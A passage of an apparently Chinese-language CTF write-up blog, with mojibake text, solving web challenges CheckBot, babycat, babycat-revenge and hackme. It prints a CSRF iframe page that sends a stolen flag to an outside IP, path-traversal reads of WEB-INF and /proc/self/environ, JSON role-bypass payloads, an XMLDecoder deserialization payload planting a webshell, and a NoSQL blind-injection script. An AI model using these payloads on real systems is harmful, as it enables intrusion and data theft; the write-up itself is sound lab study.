title="CheckBot"></a>CheckBot</h3><blockquote><p>è®©botè®¿é—®/admin.phpæ‰æœ‰flagï¼Œä½†æ˜¯æ€ä¹ˆå¸¦å‡ºæ¥å‘¢</p></blockquote><p>ä¸»é¡µé¢å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹æç¤ºï¼Œç»“åˆé¢˜ç›®çš„ hint å¯ä»¥å®ç°ä¸€ä¸ª CSRF æ¥è®¿é—® admin.phpã€‚çº¯ç²¹ä½¿ç”¨ XMLHttpRequest ä¼šé€ æˆä¸€æ¬¡è·¨åŸŸè¯·æ±‚ä»è€Œæ— æ³•æˆåŠŸã€‚å› æ­¤é‡‡ç”¨ä¸€ä¸ª iframe æ¥ä»£æ›¿ã€‚æ„é€ å¦‚ä¸‹é¡µé¢ï¼Œæ”¾åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œç„¶åå°†é“¾æ¥æäº¤ç»™ Botã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/admin.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">/* Prepare flag */</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).contentWindow.document.getElementById(<span class="string">&quot;flag&quot;</span>).innerHTML;</span></span><br><span class="line"><span class="javascript">                <span class="comment">/* Export flag */</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> exportFlag = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">                exportFlag.open(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;http://8.136.8.210:3255/flagis-&#x27;</span> + <span class="built_in">window</span>.btoa(flag));</span></span><br><span class="line">                exportFlag.send();</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨æœåŠ¡ç«¯çš„å¯¹åº”ç«¯å£å¼€å¯ç›‘å¬ï¼Œå³å¯ç›‘å¬åˆ°åŒ…å« Base64 ç¼–ç åçš„ flag çš„è¯·æ±‚ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626585233142/04040d9328142655595470c491d086dbf5140e7f.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b441a430-7064-4012-b862-dd8b7d71db91&#125;</span><br></pre></td></tr></table></figure><h3 id="babycat"><a href="#babycat" class="headerlink" title="babycat"></a>babycat</h3><h4 id="ç®¡ç†å‘˜è´¦æˆ·è·å–"><a href="#ç®¡ç†å‘˜è´¦æˆ·è·å–" class="headerlink" title="ç®¡ç†å‘˜è´¦æˆ·è·å–"></a>ç®¡ç†å‘˜è´¦æˆ·è·å–</h4><p>ç™»å½•ä¸€æ¬¡å‘ç°ä¼ é€çš„æ˜¯ JSONï¼ŒåŒæ—¶ <code>/register</code> è·¯ç”±ä¸‹å¯ä»¥å‘ç°å¦‚ä¸‹ JS ä»£ç ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var obj=&#123;&#125;;</span></span><br><span class="line"><span class="comment">// obj[&quot;username&quot;]=&#x27;test&#x27;;</span></span><br><span class="line"><span class="comment">// obj[&quot;password&quot;]=&#x27;test&#x27;;</span></span><br><span class="line"><span class="comment">// obj[&quot;role&quot;]=&#x27;guest&#x27;;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doRegister</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj.username==<span class="literal">null</span> || obj.password==<span class="literal">null</span>)&#123;</span><br><span class="line">        alert(<span class="string">&quot;ç”¨æˆ·åæˆ–å¯†ç ä¸èƒ½ä¸ºç©º&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">        d.username=obj.username;</span><br><span class="line">        d.password=obj.password;</span><br><span class="line">        d.role=<span class="string">&quot;guest&quot;</span>;</span><br><span class="line"></span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">&quot;/register&quot;</span>,</span><br><span class="line">            type:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">            contentType: <span class="string">&quot;application/x-www-form-urlencoded; charset=utf-8&quot;</span>,</span><br><span class="line">            data: <span class="string">&quot;data=&quot;</span>+<span class="built_in">JSON</span>.stringify(d),</span><br><span class="line">            dataType: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                alert(data)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤å¯ä»¥å¾—çŸ¥æ³¨å†Œçš„è¡¨å•ç»“æ„ï¼Œå‘é€ json è½½è·æ³¨å†Œä¸€ä¸ªç”¨æˆ·ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626756458625424/cb0a424ad6fb71fb341579799848e07861ca90ec.png"></p><p>ç™»å½•ä¹‹ååœ¨ä¸‹è½½æµ‹è¯•å¤„å¯ä»¥å‘ç°ä¸€ä¸ªç›®å½•ç©¿è¶Šï¼Œæ„é€  <code>file=../../WEB-INF/web.xml</code> å°è¯•è¯»å–å‡º web.xmlã€‚å› ä¸ºä¸Šä¼ ä¸šåŠ¡åªæœ‰ç®¡ç†å‘˜å¯ä»¥ä½¿ç”¨å®ƒï¼Œå› æ­¤æ ¹æ®å…¶ä¸­çš„å†…å®¹æ„é€  <code>../../WEB-INF/classes/com/web/servlet/registerServlet.class</code> å…ˆçœ‹æ³¨å†Œçš„æºç ã€‚ä½¿ç”¨ jadx åç¼–è¯‘ class æ–‡ä»¶å¯ä»¥çœ‹åˆ°å…¶æºç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626756906616529/db5a43545addacb431d210985fa39d4f54bcf75e.png@.jpg"></p><p>å¯ä»¥å¾ˆå®¹æ˜“æ‰¾åˆ°å¦‚ä¸‹é’ˆå¯¹å‚æ•° <code>role</code> çš„å¤„ç†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">var</span> = req.getParameter(<span class="string">&quot;data&quot;</span>).replaceAll(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">Matcher matcher = Pattern.compile(<span class="string">&quot;\&quot;role\&quot;:\&quot;(.*?)\&quot;&quot;</span>).matcher(<span class="keyword">var</span>);</span><br><span class="line"><span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">    role = matcher.group();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!StringUtils.isNullOrEmpty(role)) &#123;</span><br><span class="line">    person = (Person) gson.fromJson(<span class="keyword">var</span>.replace(role, <span class="string">&quot;\&quot;role\&quot;:\&quot;guest\&quot;&quot;</span>), Person.class);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    person = (Person) gson.fromJson(<span class="keyword">var</span>, Person.class);</span><br><span class="line">    person.setRole(<span class="string">&quot;guest&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æœ‰ä¸¤ç§æ–¹æ³•å»ç»•è¿‡ï¼Œå› ä¸ºæ­£åˆ™è¡¨è¾¾å¼åŒ…æ‹¬äº† <code>\&quot;role\&quot;:\&quot;(.*?)\&quot;</code> è¿›è¡Œå®Œæ•´åŒ¹é…ï¼Œè€Œ JSON ä¸­çš„å†…è”æ³¨é‡Šä¸ä¼šå½±å“å…¶è§£æï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨æ³¨é‡Šæ¥ç ´åæ­£åˆ™åŒ¹é…ã€‚ä¸ºäº†è®©å…¶ä¸ç›´æ¥èµ°åˆ° <code>setRole</code>ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦è®©æ­£åˆ™åŒ¹é…æœ‰ç»“æœã€‚JSON ä¸­é”®å€¼ä¸€æ ·çš„æ•°æ®è§£ææ—¶åé¢çš„ä¼šè¦†ç›–å‰é¢çš„ï¼Œå› æ­¤å¯ä»¥æ„é€ å¦‚ä¸‹è½½è·ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;LemonPrefect&quot;</span>,<span class="attr">&quot;password&quot;</span>:<span class="string">&quot;pass&quot;</span>,<span class="attr">&quot;role&quot;</span>:<span class="string">&quot;superUserLemonPrefect&quot;</span>,<span class="attr">&quot;role&quot;</span><span class="comment">/**/</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ³¨æ„åˆ°è¿™é‡Œå–å¾—çš„æ­£åˆ™åŒ¹é…ç»“æœæ˜¯æœ€åä¸€ä¸ªï¼Œåœ¨å¯ä»¥ä½¿ç”¨æ³¨é‡Šçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥æ„é€ å¦‚ä¸‹è½½è·ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;LemonPrefect&quot;</span>,<span class="attr">&quot;password&quot;</span>:<span class="string">&quot;pass&quot;</span>,<span class="attr">&quot;role&quot;</span>:<span class="string">&quot;admin&quot;</span><span class="comment">/*,&quot;role&quot;:&quot;guest&quot;*/</span>&#125;</span><br></pre></td></tr></table></figure><p>å‘é€ä¸Šè¿°è½½è·å³å¯å¾—åˆ°ç®¡ç†å‘˜è´¦æˆ·ï¼Œç™»å½•ä¹‹åå¯ä»¥è®¿é—®ä¸Šä¼ ä¸šåŠ¡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626757517345095/3a190e8ecff9137a3abb6f53ad4553fa65bf0579.png"></p><h4 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h4><p>æ­¤æ—¶å†æ¥è¯»ä¸Šä¼ çš„æºç ï¼Œæ„é€ å‡ºè½½è· <code>file=../../WEB-INF/classes/com/web/servlet/uploadServlet.class</code> æ¥è¯»å–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (checkExt(ext) || checkContent(item.getInputStream())) &#123;</span><br><span class="line">    req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">    req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/upload.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">&#125;</span><br><span class="line">item.write(<span class="keyword">new</span> File(uploadPath + File.separator + name + ext));</span><br><span class="line">req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload success!&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ£€æµ‹æ‹“å±•åç™½åå•åæ²¡æœ‰é€€å‡ºï¼Œå“åº”åä»ç„¶ä¼šä¿å­˜æ–‡ä»¶ï¼Œå› æ­¤å¯ä»¥å°è¯•å‘ <code>../../static/</code> ä¸‹å†™å…¥ä¸€å¥è¯ã€‚ä½¿ç”¨å†°èè¿æ¥å³å¯æ‰§è¡Œ <code>/readflag</code> ä»è€Œè·å–åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626759548380742/f59749af93c79c1514d0d17c347964cbf6f1a70d.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;beed2f77-3c76-492a-86b7-a00741f7cddc&#125;</span><br></pre></td></tr></table></figure><h3 id="babycat-revenge"><a href="#babycat-revenge" class="headerlink" title="babycat-revenge"></a>babycat-revenge</h3><blockquote><p>1.ä½ çŸ¥é“æ³¨é‡Šç¬¦å— 2.PrintWriterï¼Ÿ</p></blockquote><p>åŸæœ¬çš„ä¸Šä¼ é€»è¾‘å·²ç»ä¿®å¤å¦‚ä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (checkExt(ext) || checkContent(item.getInputStream())) &#123;</span><br><span class="line">    req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">    req.getRequestDispatcher(<span class="string">&quot;../WEB-INF/upload.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    item.write(<span class="keyword">new</span> File(uploadPath + File.separator + name + ext));</span><br><span class="line">    req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;upload success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å†çœ‹ä¸Šä¼ æ–‡ä»¶ç™½åå•ï¼Œå…è®¸ä¸Šä¼ çš„æ–‡ä»¶ä¸­æœ‰ xml æ–‡ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkExt</span><span class="params">(String ext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!Arrays.asList(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>, <span class="string">&quot;bak&quot;</span>, <span class="string">&quot;properties&quot;</span>, <span class="string">&quot;xml&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;xhtml&quot;</span>, <span class="string">&quot;zip&quot;</span>, <span class="string">&quot;gz&quot;</span>, <span class="string">&quot;tar&quot;</span>, <span class="string">&quot;txt&quot;</span>).contains(ext.toLowerCase())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ³¨å†Œä¸šåŠ¡ä¸­å¯¼å…¥äº† <code>com.web.dao.baseDao</code>ï¼Œåœ¨å…¶æºç ä¸­ç”¨åˆ°äº†æ–¹æ³• <code>XMLDecoder</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getConfig</span><span class="params">()</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">    HashMap map;</span><br><span class="line">    Object obj = <span class="keyword">new</span> XMLDecoder(<span class="keyword">new</span> FileInputStream(System.getenv(<span class="string">&quot;CATALINA_HOME&quot;</span>) + <span class="string">&quot;/webapps/ROOT/WEB-INF/db/db.xml&quot;</span>)).readObject();</span><br><span class="line">    <span class="keyword">if</span> ((obj <span class="keyword">instanceof</span> HashMap) &amp;&amp; (map = (HashMap) obj) != <span class="keyword">null</span> &amp;&amp; map.get(<span class="string">&quot;url&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        driver = (String) map.get(<span class="string">&quot;driver&quot;</span>);</span><br><span class="line">        url = (String) map.get(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        username = (String) map.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        password = (String) map.get(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>System.getenv(&quot;CATALINA_HOME&quot;)</code> å¯ä»¥ä½¿ç”¨å‰é¢çš„æ–‡ä»¶åŒ…å«è¯»å– <code>/proc/self/environ</code> å¾—åˆ°ä¸º <code>/usr/local/tomcat</code>ã€‚å› æ­¤å¯ä»¥å°è¯•å°† db.xml è¦†ç›–ä¸ºæ¶æ„ä»£ç åä½¿ç”¨æ³¨å†Œä¸šåŠ¡è§¦å‘ XMLDecoder ååºåˆ—åŒ–ã€‚ä¸Šä¼ ä¸šåŠ¡ä¸­è¿˜å¯¹ä¸Šä¼ çš„å†…å®¹æ‰§è¡Œäº†æ£€æµ‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkContent</span><span class="params">(InputStream item)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String[] blackList;</span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">        BufferedReader bf = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(item));</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            String line = bf.readLine();</span><br><span class="line">            <span class="keyword">if</span> (line == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(line);</span><br><span class="line">        &#125;</span><br><span class="line">        String content = sb.toString();</span><br><span class="line">        <span class="keyword">for</span> (String str : <span class="keyword">new</span> String[]&#123;<span class="string">&quot;Runtime&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;ProcessBuilder&quot;</span>, <span class="string">&quot;jdbc&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>&#125;) &#123;</span><br><span class="line">            <span class="keyword">if</span> (content.contains(str)) &#123;</span><br><span class="line">                flag = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è€ƒè™‘ä½¿ç”¨ hint ä¸­æåˆ°çš„ <code>PrintWriter</code> å»å†™å…¥å†°èçš„ä¸€å¥è¯ï¼Œæ„é€ å‡ºå¦‚ä¸‹è½½è·ä¸Šä¼ ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/usr/local/tomcat/webapps/ROOT/static/shell.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;println&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>&lt;![CDATA[å†°èçš„è½½è·]]&gt;<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;close&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626763390869337/6a1127a1479f3693b81dab6f6c0bd5ce7d85d9f6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2dea8c2c-fd37-4f34-81a8-a1ee48f49039&#125;</span><br></pre></td></tr></table></figure><h3 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h3><h4 id="SQL-æ³¨å…¥è¯»å–æ–‡ä»¶"><a href="#SQL-æ³¨å…¥è¯»å–æ–‡ä»¶" class="headerlink" title="SQL æ³¨å…¥è¯»å–æ–‡ä»¶"></a>SQL æ³¨å…¥è¯»å–æ–‡ä»¶</h4><p>åœ¨é¡µé¢æºç ä¸­å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹æç¤ºã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--doyounosql?--&gt;</span></span><br></pre></td></tr></table></figure><p>å› æ­¤ä½¿ç”¨è„šæœ¬è¿›è¡Œ NoSQL ç›²æ³¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">characters = string.ascii_letters + string.digits  <span class="comment"># [A-Za-z0-9]</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&#123;&quot;username&quot;:&#123;&quot;$\\u0065\\u0071&quot;: &quot;admin&quot;&#125;, &quot;password&quot;: &#123;&quot;$\\u0072\\u0065\\u0067\\u0065\\u0078&quot;: &quot;^%s&quot;&#125;&#125;&quot;&quot;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://node4.buuoj.cn:25717/login.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> characters:</span><br><span class="line">        response = requests.post(url=url, data=(payload % (password + character)),</span><br><span class="line">                                 headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=UTF-8&quot;</span>&#125;)</span><br><span class="line">        responseContent = response.content.decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Trying <span class="subst">&#123;character&#125;</span> with response <span class="subst">&#123;responseContent&#125;</span>&quot;</span>)</span><br><span class="line">        response.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ç™»å½•äº†&quot;</span> <span class="keyword">in</span> responseContent:</span><br><span class="line">            password += character</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Found new character <span class="subst">&#123;character&#125;</span> with password now which is <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—å‡ºç”¨æˆ· <code>admin</code> çš„å¯†ç ä¸º <code>42276606202db06ad1f29ab6b4a1307f</code>ã€‚ç™»å½•ä¹‹åå¯ä»¥ä¼ å…¥æ–‡ä»¶è·¯å¾„è¯»å–æ–‡ä»¶ï¼Œå°è¯•è¯»å–å‡º <code>/flag</code> å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(5) &quot;&#x2F;flag&quot; flag is in the Intranet</span><br></pre></td></tr></table></figure><p>è¯»å– <code>/proc/self/environ</code>ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(18) &quot;&#x2F;proc&#x2F;self&#x2F;environ&quot; USER&#x3D;nginxPWD&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;htmlSHLVL&#x3D;1HOME&#x3D;&#x2F;home&#x2F;nginx_&#x3D;&#x2F;usr&#x2F;bin&#x2F;php</span><br></pre></td></tr></table></figure><p>è¯»å– nginx çš„é…ç½®æ–‡ä»¶å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 